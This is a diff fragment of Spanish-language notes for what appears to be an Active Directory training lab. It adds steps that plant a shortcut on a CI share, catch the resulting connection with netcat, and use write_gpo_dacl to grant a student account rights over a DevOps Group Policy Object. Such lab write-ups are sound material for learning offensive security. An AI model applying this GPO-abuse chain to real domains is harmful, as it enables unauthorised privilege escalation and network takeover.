@@ -54,4 +54,14 @@ Este *shortcut* lo copiaremos en *\\\dcorp-ci\AI*
 xcopy C:\AD\Tools\student97.lnk \\dcorp-ci\AI
 ```
 
-Ahora lo ejecutaremos haciendo doble clic
+Ahora lo ejecutaremos con doble clic y esperaremos a recibir una conexión, una vez que tengamos la conexión nos conectaremos a esta con *NetCat*
+```shell
+.\netcat-win32-1.12\nc.exe 127.0.0.1 11000
+```
+
+Ahora deberemos asignarle permisos con respecto a la GPO de DevOps `{0BF8D01C-1F62-4BDC-958C-57140B67D147}` usando
+```shell
+write_gpo_dacl student867 {0BF8D01C-1F62-4BDC-958C-57140B67D147}
+```
+
+Una vez añadidos a esta GPO podemos parar la ejecucion de estas dos herramientas
